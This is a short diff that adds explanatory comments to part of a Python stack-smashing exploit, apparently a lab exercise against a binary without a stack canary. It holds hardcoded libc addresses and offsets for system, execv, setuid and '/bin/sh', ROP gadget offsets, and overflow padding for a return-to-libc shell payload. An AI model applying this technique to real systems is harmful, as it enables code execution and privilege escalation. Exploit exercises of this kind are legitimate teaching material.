@@ -10,9 +10,12 @@ def get_addr_from_offset(known_addr, known_addr_offset, target_addr_offset):
 
 def smash_no_canary():
     # important addresses
+
+    # address of libc_system at runtime
     libc_system = 0x7ffff7e12290
     libc_exit = 0x7ffff7e06a40
 
+    # addresses of libc before linking (relative addresses)
     libc_execv_unlinked = 0xe3170
     libc_setuid_unlinked = 0xe4150
     libc_bin_sh_unlinked = 0x1b45bd
@@ -22,6 +25,7 @@ def smash_no_canary():
     pop_rsi_ret_unlinked = 0x2601f
     # gadget_unlinked = 0x248f2
 
+    # get the runtime addresses
     gadget_addr = get_addr_from_offset(libc_system, libc_system_unlinked, gadget_unlinked)
 
     ret_gadget_addr = get_addr_from_offset(libc_system, libc_system_unlinked, ret_gadget_unlinked)
@@ -38,6 +42,7 @@ def smash_no_canary():
     padding = 64*"A"
     padding = bytes(padding, 'ascii')
 
+    # base pointer preservation
     rbp_padding = 0x7fffffffe028
     rbp_padding = struct.pack("L", rbp_padding)
 
